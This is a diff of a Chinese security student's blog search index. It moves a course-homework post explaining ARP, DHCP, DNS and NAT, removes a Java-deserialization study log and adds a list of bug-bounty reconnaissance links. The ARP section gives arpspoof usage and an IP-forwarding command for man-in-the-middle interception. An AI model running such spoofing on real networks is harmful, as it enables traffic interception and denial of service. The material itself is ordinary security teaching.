-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">graph LR;</span><br><span class="line">  A[主机A]--ip,mac,B的ip,询问B的MAC--&gt;B[主机B]</span><br><span class="line">  C[攻击机]--疯狂回复A,B的ip,MAC--&gt;A1[主机A]</span><br></pre></td></tr></table></figure>
-
-<p>断网攻击类型：</p>
-<ul>
-<li>1.主机欺骗：欺骗对象为主机。</li>
-<li>2.网关欺骗：欺骗对象为网关，可以获得其他主机的进流量。</li>
-</ul>
-<p>利用工具：</p>
-<p>​		kali ：arpspoof</p>
-<p>用法：arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host。</p>
-<p>参数：</p>
-<blockquote>
-<p>-i interface 指定要使用的接口（即指定一块网卡）</p>
-<p>-t target   指定一个将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）可以重复指定多个主机</p>
-<p>host  host是你想要截获数据包的主机(通常是网关)</p>
-<p> -c own|host|both         指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。</p>
-<p> -r     毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）</p>
-</blockquote>
-<p>注意：<strong>在使用arp欺骗前先开启Kali的IP转发，使用命令：</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
-
-<p>参数举例：arpspoof -i eth0 -t 192.168.0.103 192.168.0.107。</p>
-<p>即： arpspoof   -i   网卡   -t    目标IP    网关。</p>
-<h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><h4 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h4><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议），前身是BOOTP协议，是一个局域网的网络协议，使用UDP协议工作，统一使用两个IANA分配的端口：67（服务器端），68（客户端）。在TCP&#x2F;IP网络中对客户机动态分配和管理IP地址等配置信息，以简化网络配置，方便用户使用及管理员的管理。</p>
-<blockquote>
-<p>•一台DHCP服务器可以是一台运行Windows Server、UNIX或Linux的计算机，也可以是一台路由器或交换机。</p>
-</blockquote>
-<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127112833046.png" alt="4"></p>
-<h4 id="DHCP-的安全问题"><a href="#DHCP-的安全问题" class="headerlink" title="DHCP 的安全问题"></a>DHCP 的安全问题</h4><p>非法DHCP服务器接入到了网络中；“冒充”为这个网段中的合法DHCP服务器。</p>
-<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127112955183.png" alt="5"></p>
-<h2 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h2><p>DNS作用-主机IP地址与主机名之间的对应关系。</p>
-<p>起初是随着接入网络主机的增多，这种数字标识的地址非常不便于记忆，unix便建立一个叫做hosts的文件 ， 这个文件中记录这主机域名和IP地址的对应表。这样只要输入主机名称，系统就会去加载hosts文件并查找对应关系，找到对应的IP，就可以访问这个IP的主机了。之后再Linux和windows也继承了这个文件。</p>
-<p>而DNS服务器用于集中报存hosts文件，用于用户方便查询和实时更新hosts数据。DNS协议运行在UDP协议之上，使用端口号53。</p>
-<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127113431328.png" alt="6"></p>
-<p>​																				域名查询图</p>
-<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127113508694.png" alt="7"></p>
-<p>客户端先从本地计算机上查询域名对应的ip，如果未查询到，便访问DNS服务器（8.8.8.8 ，114.114.114.114）ip去查询域名对应的ip,若还未查询到便访问上一级DNS服务器直到根服务器位置，并返回数据。</p>
-<h2 id="NAT服务"><a href="#NAT服务" class="headerlink" title="NAT服务"></a>NAT服务</h2><p>NAT（Network Address Translator，网络地址转换）是用于在本地网络中使用私有地址，在连接互联网时转而使用全局 IP 地址的技术。NAT实际上是为解决<a href="https://link.zhihu.com/?target=https://bk.tw.lvfukeji.com/baike-IPv4%E4%BD%8D%E5%9D%80%E6%9E%AF%E7%AB%AD">IPv4地址短缺</a>而开发的技术。</p>
-<h4 id="NAT工作原理"><a href="#NAT工作原理" class="headerlink" title="NAT工作原理"></a>NAT工作原理</h4><p>内容参考[《什么是NAT》](<a href="https://zhuanlan.zhihu.com/p/340698491">什么是NAT？ - 知乎 (zhihu.com)</a>)</p>
-<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/1.jpg" alt="8"></p>
-<p>​						</p>
-<ul>
-<li>网络被分为私网和公网两个部分，NAT网关设置在私网到公网的路由出口位置，双向流量必须都要经过NAT网关；</li>
-<li>网络访问只能先由私网侧发起，公网无法主动访问私网主机；</li>
-<li>NAT 路由器在两个访问方向上完成两次地址的转换或翻译，出方向做源信息替换，入方向做目的信息替换；</li>
-<li>NAT 路由器的存在对通信双方是保持透明的；</li>
-<li>NAT 路由器为了实现双向翻译的功能，需要维护一张<strong>关联表</strong>，把会话的信息保存下来。</li>
-</ul>
-<p>NAT可以划分为以下两种类型：源网络地址转换-Source NAT-SNAT;目的网络地址转换-Destination NAT-DNAT。</p>
-<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/3.jpg" alt="9"></p>
-<p>主机 163.221.120.9 的端口号是 80，私网中有 2 个客户端 10.0.0.10 和 10.0.0.11 同时进行通信，并且这 2 个客户端的本地端口都是 1025。此时，仅仅转换 IP 地址为全局地址 202.244.174.37 ，会令转换后的数字完全一致。因此，为了区分这 2 个会话，只要将 10.0.0.11 的端口号转换为 1026 就可以解决问题。NAPT 路由器通过生成转换表，就可以正确地转换地址跟端口的组合，使客户端A、B能同时与服务器之间进行通信。</p>
-<p><strong>关键点</strong>：利用端口号的唯一性实现了公网 IP 到私网 IP 的转换，理论上最多可以让 65535 台主机共用一个公网 IP 地址</p>
-]]></content>
-      <categories>
-        <category>网络渗透测试基础知识</category>
-      </categories>
-      <tags>
-        <tag>网络渗透测试基础知识,DNS,ARP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网络安全测试课程-作业-3</title>
     <url>/2023/11/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-3/</url>
     <content><![CDATA[<h3 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h3><p>TCP 提供面向有连接的通信传输，面向有连接是指在传送数据之前必须先建立连接，数据传送完成后要释放连接。</p>
@@ -1405,6 +1382,93 @@ icp="京ICP证030173号"：查找备案号为“京ICP证030173号的网站<p></
       </categories>
       <tags>
         <tag>网络渗透测试基础知识,wireshark</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络安全测试课程-作业-4</title>
+    <url>/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/</url>
+    <content><![CDATA[<h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h4><ul>
+<li><p>arp（Address Resolution Protocol），即地址解析协议，属于<strong>数据链路层</strong>，是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</p>
+</li>
+<li><p>cmd查看arp -a</p>
+<blockquote>
+<p>在以太网中，同一局域网中的一台主机想要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP&#x2F;IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议含有的上层IP协议提供的数据中，只包含目的主机的IP地址。所以需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127102741981.png" alt="1"></p>
+<ul>
+<li><p>每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。ARP高速缓存是实时更新的，每次开机后会清空缓存并重新获取。</p>
+</li>
+<li><p>如果本机想与某台主机通信，则首先在ARP高速缓存(动态更新)中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间。</p>
+</li>
+<li><p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/%7B89D8FD6A-F64C-40cb-900F-6AC24E460C6B%7D.png" alt="2"></p>
+<p>​      																	ARP请求广播到局域网络上的所有主机</p>
+<h4 id="ARP表"><a href="#ARP表" class="headerlink" title="ARP表"></a>ARP表</h4></li>
+</ul>
+<p>网络设备一般都有一个ARP缓存（ARP Cache），ARP缓存用来存放IP地址和MAC地址的关联信息。在数据传送前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应的信息，则通过发送ARP 报文来获取。获取到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期（一般为关机前）内，设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进行ARP查询。过了这段有效期，ARP表现会被自动删除。如果目标设备位于其他网络则源设备会在ARP缓存表中查找网关的MAC地址，然后将数据发送给网关，网关再把数据转发给目的设备。</p>
+<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/%7BADEF15EC-3ABE-49ea-9D9B-24F7D6E58772%7D.png" alt="3"></p>
+<h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><p>当有2台或者多台计算机进行交互时，例如主机A与主机B进行交互，A在已知B的IP，但不知到B的MAC地址时，是无法通信的。</p>
+<p>当A主机上在查询Arp缓存时未能找到B的MAC地址时，会进行广播到本地网络上的所有主机（发送的数据包含A的Ip与MAC地址），主机B的IP与广播中所请求的IP地址相同时，主机B将A的IP地址和MAC地址映射添加到本地ARP缓存中。同时主机B将包含其MAC地址的ARP回复消息直接发送回主机A。当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。</p>
+<p>此时，由于主机A并不会验证B发送的回复包是否具有真实性，因此我们可以伪造成B发送回复包。例如:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">graph LR;</span><br><span class="line">  A[主机A]--ip,mac,B的ip,询问B的MAC--&gt;B[主机B]</span><br><span class="line">  C[攻击机]--疯狂回复A,B的ip,MAC--&gt;A1[主机A]</span><br></pre></td></tr></table></figure>
+
+<p>断网攻击类型：</p>
+<ul>
+<li>1.主机欺骗：欺骗对象为主机。</li>
+<li>2.网关欺骗：欺骗对象为网关，可以获得其他主机的进流量。</li>
+</ul>
+<p>利用工具：</p>
+<p>​		kali ：arpspoof</p>
+<p>用法：arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host。</p>
+<p>参数：</p>
+<blockquote>
+<p>-i interface 指定要使用的接口（即指定一块网卡）</p>
+<p>-t target   指定一个将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）可以重复指定多个主机</p>
+<p>host  host是你想要截获数据包的主机(通常是网关)</p>
+<p> -c own|host|both         指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。</p>
+<p> -r     毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）</p>
+</blockquote>
+<p>注意：<strong>在使用arp欺骗前先开启Kali的IP转发，使用命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<p>参数举例：arpspoof -i eth0 -t 192.168.0.103 192.168.0.107。</p>
+<p>即： arpspoof   -i   网卡   -t    目标IP    网关。</p>
+<h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><h4 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h4><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议），前身是BOOTP协议，是一个局域网的网络协议，使用UDP协议工作，统一使用两个IANA分配的端口：67（服务器端），68（客户端）。在TCP&#x2F;IP网络中对客户机动态分配和管理IP地址等配置信息，以简化网络配置，方便用户使用及管理员的管理。</p>
+<blockquote>
+<p>•一台DHCP服务器可以是一台运行Windows Server、UNIX或Linux的计算机，也可以是一台路由器或交换机。</p>
+</blockquote>
+<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127112833046.png" alt="4"></p>
+<h4 id="DHCP-的安全问题"><a href="#DHCP-的安全问题" class="headerlink" title="DHCP 的安全问题"></a>DHCP 的安全问题</h4><p>非法DHCP服务器接入到了网络中；“冒充”为这个网段中的合法DHCP服务器。</p>
+<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127112955183.png" alt="5"></p>
+<h2 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h2><p>DNS作用-主机IP地址与主机名之间的对应关系。</p>
+<p>起初是随着接入网络主机的增多，这种数字标识的地址非常不便于记忆，unix便建立一个叫做hosts的文件 ， 这个文件中记录这主机域名和IP地址的对应表。这样只要输入主机名称，系统就会去加载hosts文件并查找对应关系，找到对应的IP，就可以访问这个IP的主机了。之后再Linux和windows也继承了这个文件。</p>
+<p>而DNS服务器用于集中报存hosts文件，用于用户方便查询和实时更新hosts数据。DNS协议运行在UDP协议之上，使用端口号53。</p>
+<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127113431328.png" alt="6"></p>
+<p>​																				域名查询图</p>
+<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127113508694.png" alt="7"></p>
+<p>客户端先从本地计算机上查询域名对应的ip，如果未查询到，便访问DNS服务器（8.8.8.8 ，114.114.114.114）ip去查询域名对应的ip,若还未查询到便访问上一级DNS服务器直到根服务器位置，并返回数据。</p>
+<h2 id="NAT服务"><a href="#NAT服务" class="headerlink" title="NAT服务"></a>NAT服务</h2><p>NAT（Network Address Translator，网络地址转换）是用于在本地网络中使用私有地址，在连接互联网时转而使用全局 IP 地址的技术。NAT实际上是为解决<a href="https://link.zhihu.com/?target=https://bk.tw.lvfukeji.com/baike-IPv4%E4%BD%8D%E5%9D%80%E6%9E%AF%E7%AB%AD">IPv4地址短缺</a>而开发的技术。</p>
+<h4 id="NAT工作原理"><a href="#NAT工作原理" class="headerlink" title="NAT工作原理"></a>NAT工作原理</h4><p>内容参考[《什么是NAT》](<a href="https://zhuanlan.zhihu.com/p/340698491">什么是NAT？ - 知乎 (zhihu.com)</a>)</p>
+<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/1.jpg" alt="8"></p>
+<p>​						</p>
+<ul>
+<li>网络被分为私网和公网两个部分，NAT网关设置在私网到公网的路由出口位置，双向流量必须都要经过NAT网关；</li>
+<li>网络访问只能先由私网侧发起，公网无法主动访问私网主机；</li>
+<li>NAT 路由器在两个访问方向上完成两次地址的转换或翻译，出方向做源信息替换，入方向做目的信息替换；</li>
+<li>NAT 路由器的存在对通信双方是保持透明的；</li>
+<li>NAT 路由器为了实现双向翻译的功能，需要维护一张<strong>关联表</strong>，把会话的信息保存下来。</li>
+</ul>
+<p>NAT可以划分为以下两种类型：源网络地址转换-Source NAT-SNAT;目的网络地址转换-Destination NAT-DNAT。</p>
+<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/3.jpg" alt="9"></p>
+<p>主机 163.221.120.9 的端口号是 80，私网中有 2 个客户端 10.0.0.10 和 10.0.0.11 同时进行通信，并且这 2 个客户端的本地端口都是 1025。此时，仅仅转换 IP 地址为全局地址 202.244.174.37 ，会令转换后的数字完全一致。因此，为了区分这 2 个会话，只要将 10.0.0.11 的端口号转换为 1026 就可以解决问题。NAPT 路由器通过生成转换表，就可以正确地转换地址跟端口的组合，使客户端A、B能同时与服务器之间进行通信。</p>
+<p><strong>关键点</strong>：利用端口号的唯一性实现了公网 IP 到私网 IP 的转换，理论上最多可以让 65535 台主机共用一个公网 IP 地址</p>
+]]></content>
+      <categories>
+        <category>网络渗透测试基础知识</category>
+      </categories>
+      <tags>
+        <tag>网络渗透测试基础知识,DNS,ARP</tag>
       </tags>
   </entry>
   <entry>
@@ -1524,30 +1588,25 @@ icp="京ICP证030173号"：查找备案号为“京ICP证030173号的网站<p></
       </tags>
   </entry>
   <entry>
-    <title>java安全学习打卡记录</title>
-    <url>/2024/04/07/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%89%93%E5%8D%A1%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>2024.3.29 java资源查找</p>
-<p>2024.4.5 java基础操作</p>
-<p>2024.4.6，学习到了override和overload类</p>
-<p>2024.4.8，在up主<strong>首席bug专家</strong>的java课程学习到了object对象 p78课时</p>
-<p>2024.4.9，java课程学习到了封装  p82课时</p>
-<p>2024.4.10 ，java课程学习到了多态，抽象，接口 p87课时</p>
-<p>2024.4.11，java课程学习回顾</p>
-<h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><h3 id="SpringBoot学习"><a href="#SpringBoot学习" class="headerlink" title="SpringBoot学习"></a>SpringBoot学习</h3><p>2024.4.12，学习创建项目，hello world网站开始搭建和配置文件application.properties的认识</p>
-<p>2024.4.14  学习了注解的用法</p>
-<h2 id="java反序列化–并行"><a href="#java反序列化–并行" class="headerlink" title="java反序列化–并行"></a>java反序列化–并行</h2><p>2024.4.16 学习了如何继承序列化接口-&gt;.ser文件，在反序列化中执行系统函数</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>使用如下读取数据：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">   <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">   <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">while</span> ((line = reader.readLine())!= <span class="literal">null</span>) &#123;</span><br><span class="line">       System.out.println(line);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p>（@~@)Java读写内容好难受啊qwq!</p>
+    <title>src清单</title>
+    <url>/2024/04/22/src%E6%B8%85%E5%8D%95/</url>
+    <content><![CDATA[<h2 id="漏洞文章与信息搜集"><a href="#漏洞文章与信息搜集" class="headerlink" title="漏洞文章与信息搜集"></a>漏洞文章与信息搜集</h2><ul>
+<li>乌云镜像 <a href="https://wy.zone.ci/">https://wy.zone.ci/</a></li>
+<li>常见src <a href="https://github.com/Wh0ale/SRC-experience/blob/master/README.md">https://github.com/Wh0ale/SRC-experience/blob/master/README.md</a></li>
+<li>Sec-not <a href="https://github.com/reidmu/sec-note">https://github.com/reidmu/sec-note</a></li>
+<li>赏金猎人<a href="https://www.bugbountyhunter.com/">https://www.bugbountyhunter.com/</a></li>
+<li>赏金猎人漏洞搜索平台 <a href="https://www.bugbountyhunting.com/">https://www.bugbountyhunting.com/</a></li>
+<li>漏洞全收集  <a href="https://pentester.land/writeups/">https://pentester.land/writeups/</a></li>
+<li>在线子域名查询接口  <a href="https://ce.baidu.com/index/getRelatedSites?site_address%EF%BC%9D">https://ce.baidu.com/index/getRelatedSites?site_address＝</a><br><a href="https://certspotter.com/apiv0/certs?domain=">https://certspotter.com/apiv0/certs?domain=</a>          <a href="http://z.zcjun.com/">http://z.zcjun.com/</a></li>
+<li>DNS记录查询子域名:<a href="https://dnsdumpster.com、https//rapiddns.io/subdomain(%E6%8E%A8%E8%8D%90%E4%BD%BF%E7%94%A8)%E3%80%81https://suip.biz/?act=subfinder(%E6%8E%A8%E8%8D%90%E4%BD%BF%E7%94%A8)%E3%80%82">https://dnsdumpster.com、https://rapiddns.io/subdomain(推荐使用)、https://suip.biz/?act=subfinder(推荐使用)。</a> <a href="https://www.nmmapper.com/sys/tools/subdomainfinder/">https://www.nmmapper.com/sys/tools/subdomainfinder/</a>,       <a href="https://securitytrails.com/list/apex">https://securitytrails.com/list/apex</a> domain&#x2F;id.com</li>
+<li>证书查询子域名:<a href="https://crt.sh、/">https://crt.sh、</a> <a href="https://myssl.com/">https://myssl.com/</a></li>
+</ul>
 ]]></content>
       <categories>
-        <category>JAVA</category>
+        <category>漏洞src</category>
       </categories>
       <tags>
-        <tag>java</tag>
+        <tag>漏洞src</tag>
       </tags>
   </entry>
 </search>
